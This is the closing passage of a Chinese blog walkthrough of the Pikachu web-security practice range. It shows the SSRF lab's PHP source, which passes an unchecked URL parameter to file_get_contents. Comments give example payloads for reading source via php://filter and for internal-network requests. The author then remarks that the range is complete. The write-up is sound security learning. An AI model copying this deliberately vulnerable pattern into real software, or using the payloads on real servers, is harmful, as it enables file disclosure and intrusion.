class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active open&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;active&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$FILEDIR</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$RD</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="nv">$FILEDIR</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$PIKA_ROOT_DIR</span> <span class="o">=</span>  <span class="s2">&#34;../../&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">include_once</span> <span class="nv">$PIKA_ROOT_DIR</span><span class="o">.</span><span class="s1">&#39;header.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php
</span></span></span><span class="line"><span class="cl"><span class="c1">//内网请求:http://x.x.x.x/xx.index
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span> <span class="o">!=</span><span class="k">null</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$str</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>不同的函数支持不同的网络协议，实际情况中我们可以利用不同的函数所支持的各种协议构造payload来达到目的</p>
<h2 id="后记">后记</h2>
<p>pikachu靶场到此就通关了</p>
<p>不难看到这个靶场的难度还是非常低的，既可以作为像我这样的web小白的最佳入门，也非常适合作为平时少接触甚至不接触安全领域的大家的一次网络安全科普</p>
<p>接下来就要跨出新手村了，希望有一天能独当一面，挖掘出属于我自己的0Day漏洞</p>
<ul>
<li><em><a href="https://www.bilibili.com/video/BV1Bp4y1q7XF">B站 - pi</a></em><a href="https://www.bilibili.com/video/BV1Bp4y1q7XF"><em>kachu靶场全通关讲解（含代码审计）</em></a></li>
<li><em><a href="https://github.com/zhuifengshaonianhanlu/pikachu">GitHub - zhuifengshaonianhanlu/pikachu</a></em></li>
<li><a href="https://hub.docker.com/r/area39/pikachu"><em>DockerHub - area39/pikachu</em></a></li>
</ul>

            </div>
        </article>





<br>
<script src="https://utteranc.es/client.js"
        repo="ASUKA39/asuka39.github.io"
        issue-term="pathname"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script></main>
</div>
<footer class="footer">
    

    
    
</footer><a href="#" title="Go to top" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    




    
    
        
    

    
    
        
    



    
    <script async src="http://localhost:1313/js/main.js" ></script>

    

</body>
</html>
